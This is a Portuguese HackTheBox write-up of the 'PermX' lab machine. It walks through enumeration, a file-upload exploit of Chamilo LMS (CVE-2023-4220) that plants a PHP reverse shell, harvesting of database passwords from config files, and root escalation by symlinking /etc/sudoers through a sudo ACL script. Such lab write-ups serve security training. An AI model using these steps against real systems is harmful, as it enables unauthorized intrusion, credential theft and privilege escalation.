# PermX

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux |
| **IP** | 10.10.11.23 |
| **Técnicas** | Chamilo LMS, CVE-2023-4220, Symlink Privilege Escalation |
| **Link HTB** | [https://app.hackthebox.com/machines/PermX](https://app.hackthebox.com/machines/PermX) |

## Resumo

Máquina Linux rodando Chamilo LMS v1.11.24 vulnerável a CVE-2023-4220. Após obter shell, credenciais de banco de dados permitem acesso SSH. Escalação de privilégios via symlink attack em script com permissões sudo.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -oN nmap.out -vv 10.10.11.23
```

**Portas abertas:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Web Enumeration

Configuração de hosts:
```bash
echo "10.10.11.23 permx.htb" >> /etc/hosts
```

Enumeração de diretórios:
```bash
gobuster dir -t 100 -w ~/infosec/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://permx.htb/
```

**Diretórios encontrados:** `/css`, `/lib`, `/js`, `/img`

### VHost Enumeration

```bash
ffuf -c -t 100 -w ~/infosec/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fc 302
```

**Subdomínio encontrado:** `lms.permx.htb`

Adicionado ao `/etc/hosts`:
```bash
echo "10.10.11.23 lms.permx.htb" >> /etc/hosts
```

### LMS Discovery

Acessando `http://lms.permx.htb/documentation/changelog.html`, identificamos **Chamilo v1.11.24**.

## Exploitation

### CVE-2023-4220 - Chamilo LMS File Upload

Chamilo v1.11.24 é vulnerável a **CVE-2023-4220** (Unrestricted File Upload).

```bash
./CVE-2023-4220.sh -f reverse_shell.php -h http://lms.permx.htb -p 1337
```

**Shell obtido como:** `www-data`

### Database Credentials

Procurando por credenciais:

```bash
cd /var/www
grep -r "password" --include *config*
```

**Arquivo encontrado:** `./chamilo/app/config/configuration.php`

```bash
cat ./chamilo/app/config/configuration.php | grep "password"
# $_configuration['db_password'] = '***';
```

### SSH Access

```bash
su mtz
# usando db_password encontrada

cat user.txt
```

**User Flag:** ✓

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
# User mtz may run the following commands on permx:
#  (ALL : ALL) NOPASSWD: /opt/acl.sh
```

### Symlink Attack

O script `/opt/acl.sh` permite definir permissões ACL em arquivos. Podemos criar um symlink para `/etc/sudoers`:

```bash
ln -s /etc/sudoers ./symlink

sudo /opt/acl.sh mtz rwx /home/mtz/symlink

vi ./symlink
# Editando para dar all access ao mtz
# mtz ALL=(ALL:ALL) ALL
```

### Root Access

```bash
sudo su

cat /root/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **CVE-2023-4220** permite upload de arquivos maliciosos em Chamilo LMS v1.11.24
- Credenciais de banco de dados frequentemente estão em arquivos de configuração com padrão `*config*.php`
- **Symlink attacks** podem ser usados para editar arquivos privilegiados quando scripts com sudo permitem manipulação de ACLs
- Sempre verificar permissões sudo (`sudo -l`) e analisar scripts executáveis como root

---

*Writeup by kp*
